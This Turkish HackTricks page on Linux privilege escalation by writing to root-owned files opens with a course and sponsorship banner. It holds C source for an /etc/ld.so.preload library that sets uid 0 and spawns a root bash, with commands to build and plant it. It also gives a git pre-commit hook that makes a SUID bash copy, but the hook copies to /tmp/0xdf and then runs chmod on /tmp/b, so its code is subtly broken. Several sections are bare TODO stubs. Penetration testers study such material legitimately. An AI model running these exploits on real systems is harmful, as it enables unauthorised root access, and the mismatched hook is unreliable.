# Kök Klasöre Dosya Yazma

<details>

<summary><strong>AWS hackleme konusunu sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

### /etc/ld.so.preload

Bu dosya, **`LD_PRELOAD`** ortam değişkeni gibi davranır ancak aynı zamanda **SUID ikili dosyalarında** da çalışır.\
Eğer bu dosyayı oluşturabilir veya değiştirebilirseniz, her yürütülen ikili dosyayla birlikte yüklenecek bir **kütüphane yolunu ekleyebilirsiniz**.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git kancaları

[**Git kancaları**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks), bir **dizin** oluşturulduğunda veya bir birleştirme işlemi gerçekleştiğinde gibi bir git deposundaki çeşitli **olaylar** üzerinde **çalıştırılan** **betiklerdir**. Dolayısıyla, bir **özelliği olan betik veya kullanıcı** bu işlemleri sıkça gerçekleştiriyorsa ve `.git` klasörüne **yazma izni** varsa, bu **ağır ayrıcalık yükseltme** için kullanılabilir.

Örneğin, bir yeni bir işlem oluşturulduğunda her zaman çalıştırılan bir betik oluşturmak mümkündür:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zaman Dosyaları

TODO

### Servis & Soket Dosyaları

TODO

### binfmt\_misc

`/proc/sys/fs/binfmt_misc` konumunda bulunan dosya, hangi tür dosyanın hangi ikili dosyanın çalıştırılması gerektiğini belirtir. TODO: Bir yaygın dosya türü açıldığında bir ters shell çalıştırmak için bunu kötüye kullanmak için gereksinimleri kontrol edin.
